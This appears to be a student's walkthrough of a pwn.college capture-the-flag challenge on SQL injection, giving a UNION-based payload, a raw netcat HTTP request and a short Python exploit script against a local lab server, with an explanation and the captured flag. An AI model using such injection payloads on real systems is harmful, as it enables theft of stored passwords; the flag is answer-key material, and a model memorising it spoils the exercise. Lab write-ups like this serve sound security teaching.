## ✅ what i did  
I WAY -> netcat
-clicked start
-opened the terminal
-ran: cat /challenge/server'
table=users, columns=username, password
admin - [flag]
guest - password
GET 
enpoint= /
the query takes arguments from query string in the url. the identifier is query
sql=SELECT username FROM users WHERE username LIKE "{query}"
the payload i crafted is: pwn.college{" UNION SELECT password FROM users" -> urlencoded
-ran: '/challenge/localhost'
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /?query=pwn.college%7B%22%20UNION%20SELECT%20password%20FROM%20users%22 HTTP/1.1'
        'Host: challenge.localhost'
-flag popped out

II WAY -> python
-clicked start
-opened the terminal 
-ran: 'vim bro'
-typed:         '#!/usr/bin/env python3'
                'import requests'
                'from pwn import *'
                'context.log_level = 'error''
                'url = "http://challenge.localhost:80/"'
                'p = process("/challenge/server")'
                'time.sleep(1)'
                'params = {'
                        '"query" : "pwn.college{\" UNION SELECT password FROM users\""'
                        '}'
                'r = requests.get(url, params)'
                'print(r.text)'
-ran: 'chmod a+x brodi'
-ran: './brodi'
-flag popped out

## 🧑🏾‍🏫 what this challenge teaches u
this time i used UNION
since our injection goes directly to a pre-build query i crafted the payload based on the query
LIKE -> find matches in the records and prints them out. it is case INSENSITIVE
the goal is to merge password column to username column and this is possible with UNION
UNION executes the left query, then the right query and merge the results together
since admin's password is the flag, i already know the flag starts with pwn.college{
thats why i insert it into LIKE, closed the " and then escaped the last one with another " in the end
to escape chars in python use \ -> in this case it was necessary to have it interpreted " not as end of string

## 🏁 Flag  
pwn.college{Y12YxayoWpv73ATzuboFopzFbGZ.QXxkzMzwCO4IDOxEzW}
